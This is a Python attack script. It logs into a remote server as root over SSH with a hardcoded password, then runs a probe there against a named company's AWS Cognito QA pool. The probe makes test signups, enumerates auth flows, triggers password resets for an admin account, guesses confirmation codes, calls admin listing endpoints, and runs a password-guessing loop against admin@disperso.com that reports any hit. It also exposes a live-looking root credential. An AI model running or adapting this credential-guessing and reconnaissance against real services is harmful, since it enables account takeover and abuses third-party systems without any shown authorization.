"""Probe QA Cognito pool - signup, forgot password, auth flows."""
import paramiko, textwrap

VPS = "216.238.75.117"
PW = r"]Aq9mngH(_%ZV%jn"

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=20):
    hdrs = {"User-Agent": "Mozilla/5.0"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

def cognito(target, body, client="cavifd298a9olegm3j0o1jnnp"):
    return req("https://cognito-idp.us-east-2.amazonaws.com/",
               data=json.dumps(body).encode(),
               headers={
                   "Content-Type": "application/x-amz-json-1.1",
                   "X-Amz-Target": f"AWSCognitoIdentityProviderService.{target}"
               })

QA_CLIENT = "cavifd298a9olegm3j0o1jnnp"
QA_POOL = "us-east-2_MAvWIdHjw"

# ======================================================
print("=" * 60)
print("1. QA COGNITO SIGNUP ATTEMPT")
print("=" * 60)

# Basic signup
s, b, h = cognito("SignUp", {
    "ClientId": QA_CLIENT,
    "Username": "qatest@yopmail.com",
    "Password": "QaTest2026!Sec",
    "UserAttributes": [
        {"Name": "email", "Value": "qatest@yopmail.com"}
    ]
})
print(f"  SignUp basic: {s} {b[:300].decode(errors='replace')}")

# Without email attr
s, b, h = cognito("SignUp", {
    "ClientId": QA_CLIENT,
    "Username": "qatest2@yopmail.com",
    "Password": "QaTest2026!Sec"
})
print(f"  SignUp no attrs: {s} {b[:300].decode(errors='replace')}")
time.sleep(1)

# ======================================================
print("\n" + "=" * 60)
print("2. QA COGNITO INITIATEAUTH")
print("=" * 60)

# Test what auth flows are enabled
for flow in ["USER_PASSWORD_AUTH", "CUSTOM_AUTH", "USER_SRP_AUTH"]:
    s, b, h = cognito("InitiateAuth", {
        "AuthFlow": flow,
        "ClientId": QA_CLIENT,
        "AuthParameters": {
            "USERNAME": "admin@disperso.com",
            "PASSWORD": "test123"
        }
    })
    msg = b[:200].decode(errors="replace")
    tag = "!!!" if "NotAuthorizedException" in msg else ""
    print(f"  {tag} {flow}: {s} {msg}")
    time.sleep(1)

# ======================================================
print("\n" + "=" * 60)
print("3. QA FORGOT PASSWORD")
print("=" * 60)

for email in ["admin@disperso.com", "qatest@yopmail.com"]:
    s, b, h = cognito("ForgotPassword", {
        "ClientId": QA_CLIENT,
        "Username": email
    })
    msg = b[:200].decode(errors="replace")
    tag = "!!!" if "CodeDelivery" in msg else ""
    print(f"  {tag} {email}: {s} {msg}")
    time.sleep(1)

# ======================================================
print("\n" + "=" * 60)
print("4. QA RESEND + CONFIRM (if signup worked)")
print("=" * 60)

s, b, h = cognito("ResendConfirmationCode", {
    "ClientId": QA_CLIENT,
    "Username": "qatest@yopmail.com"
})
print(f"  Resend qatest@yopmail: {s} {b[:200].decode(errors='replace')}")

s, b, h = cognito("ConfirmSignUp", {
    "ClientId": QA_CLIENT,
    "Username": "qatest@yopmail.com",
    "ConfirmationCode": "000000"
})
print(f"  Confirm qatest@yopmail: {s} {b[:200].decode(errors='replace')}")
time.sleep(1)

# ======================================================
print("\n" + "=" * 60)
print("5. QA DESCRIBE (what we can learn)")
print("=" * 60)

targets = [
    ("DescribeUserPoolClient", {"UserPoolId": QA_POOL, "ClientId": QA_CLIENT}),
    ("ListUsers", {"UserPoolId": QA_POOL, "Limit": 1}),
    ("GetUserPoolMfaConfig", {"UserPoolId": QA_POOL}),
]
for target, body in targets:
    s, b, h = cognito(target, body)
    print(f"  {target}: {s} {b[:200].decode(errors='replace')}")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("6. QA COMMON PASSWORDS (admin@disperso.com)")
print("=" * 60)

passwords = [
    "Admin123!", "admin123!", "Disperso2024!", "Disperso2025!", "Disperso2026!",
    "Tuxpan2024!", "Tuxpan2025!", "Tuxpan2026!",
    "Password1!", "Passw0rd!", "Qwerty123!", "Test1234!",
    "D1sperso!", "Welcome1!", "Chile2024!", "Chile2025!", "Chile2026!",
]
for pwd in passwords:
    s, b, h = cognito("InitiateAuth", {
        "AuthFlow": "USER_SRP_AUTH",
        "ClientId": QA_CLIENT,
        "AuthParameters": {
            "USERNAME": "admin@disperso.com",
            "SRP_A": "a" * 512
        }
    })
    msg = b[:200].decode(errors="replace")
    # SRP_AUTH just returns challenge, we need USER_PASSWORD_AUTH
    # Check if it's enabled
    if "InvalidParameterException" in msg or "not enabled" in msg.lower():
        print(f"  USER_SRP_AUTH requires SRP calc, trying USER_PASSWORD_AUTH...")
        break
    elif "PASSWORD_VERIFIER" in msg:
        # SRP is enabled and working
        print(f"  SRP challenge returned - auth flow works!")
        break
    else:
        print(f"  {s} {msg[:100]}")
    time.sleep(0.5)

# If USER_PASSWORD_AUTH is enabled on QA, test passwords
s, b, h = cognito("InitiateAuth", {
    "AuthFlow": "USER_PASSWORD_AUTH",
    "ClientId": QA_CLIENT,
    "AuthParameters": {
        "USERNAME": "admin@disperso.com",
        "PASSWORD": "test"
    }
})
msg = b[:200].decode(errors="replace")
if "not enabled" in msg.lower():
    print("  USER_PASSWORD_AUTH not enabled on QA client")
else:
    print(f"  USER_PASSWORD_AUTH test: {s} {msg[:100]}")
    if "NotAuthorizedException" in msg or "Incorrect" in msg:
        print("  USER_PASSWORD_AUTH IS ENABLED! Testing passwords...")
        for pwd in passwords:
            s, b, h = cognito("InitiateAuth", {
                "AuthFlow": "USER_PASSWORD_AUTH",
                "ClientId": QA_CLIENT,
                "AuthParameters": {
                    "USERNAME": "admin@disperso.com",
                    "PASSWORD": pwd
                }
            })
            msg = b[:200].decode(errors="replace")
            if "NotAuthorizedException" not in msg and "Incorrect" not in msg:
                print(f"  !!!!! HIT: admin@disperso.com / {pwd}")
                print(f"  BODY: {b[:500].decode(errors='replace')}")
                break
            time.sleep(0.5)

print("\n" + "=" * 60)
print("QA COGNITO PROBE DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/qa_cognito.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, probing QA Cognito...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/qa_cognito.py 2>&1", timeout=120)
out = stdout.read().decode(errors="replace")
with open(r"c:\xampp\htdocs\pentagi\disperso_recon\qa_cognito_results.txt", "w", encoding="utf-8", errors="replace") as f:
    f.write(out)
print(out)
ssh.close()
